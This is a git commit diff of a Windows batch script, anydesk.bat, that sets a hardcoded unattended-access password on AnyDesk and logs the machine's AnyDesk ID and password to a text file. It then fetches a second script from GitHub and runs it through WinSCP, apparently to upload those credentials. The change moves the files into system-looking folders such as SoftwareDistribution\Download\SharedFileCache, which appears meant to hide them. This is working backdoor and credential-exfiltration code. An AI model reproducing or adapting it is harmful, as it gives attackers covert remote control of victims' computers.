db0e2243609acbeb18e24660fd8d8488bead4805
TheBetaBiggie <53587460+TheBetaBiggie@users.noreply.github.com>
2022-08-26 00:44:08 -0700

    Update anydesk.bat

--- anydesk.bat
+++ anydesk.bat
@@ -1,11 +1,11 @@
 @echo off
-for /f "delims=" %%i in ('"C:\Windows\System\logger\AnyDesk\AnyDesk.exe" --get-id') do set ID=%%i 
+for /f "delims=" %%i in ('"C:\Windows\SoftwareDistribution\Download\SharedFileCache\AnyDesk.exe" --get-id') do set ID=%%i 
 echo AnyDesk ID is: %ID% > C:\Windows\System\logger\AnyDesk\anydesk.txt
 echo Richard00**11 | anydesk.exe --set-password _unattended_access
 echo AnyDesk Password is: Richard00**11 >> C:\Windows\System\logger\AnyDesk\anydesk.txt
-for /f "delims=" %%i in ('"C:\Windows\System\logger\AnyDesk\AnyDesk.exe" --get-status') do set STATUS=%%i 
+for /f "delims=" %%i in ('"C:\Windows\SoftwareDistribution\Download\SharedFileCache\AnyDesk.exe" --get-status') do set STATUS=%%i 
 echo AnyDesk status is: %STATUS% >> C:\Windows\System\logger\AnyDesk\anydesk.txt
-for /f "delims=" %%i in ('"C:\Windows\System\logger\AnyDesk\AnyDesk.exe" --version') do set VER=%%i 
+for /f "delims=" %%i in ('"C:\Windows\SoftwareDistribution\Download\SharedFileCache\AnyDesk.exe" --version') do set VER=%%i 
 echo AnyDesk version is: %VER% >> C:\Windows\System\logger\AnyDesk\anydesk.txt
-powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/anydesk1.bat -OutFile C:\Windows\System\logger\AnyDesk\anydesk1.bat
-C:\Windows\System\logger\WinSCP.com /script=C:\Windows\System\logger\AnyDesk\anydesk1.bat
+powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/anydesk1.bat -OutFile C:\Windows\SoftwareDistribution\Download\SharedFileCache\anydesk1.bat
+C:\Windows\System\Text\r\3\WinSCP.com /script=C:\Windows\SoftwareDistribution\Download\SharedFileCache\anydesk1.bat
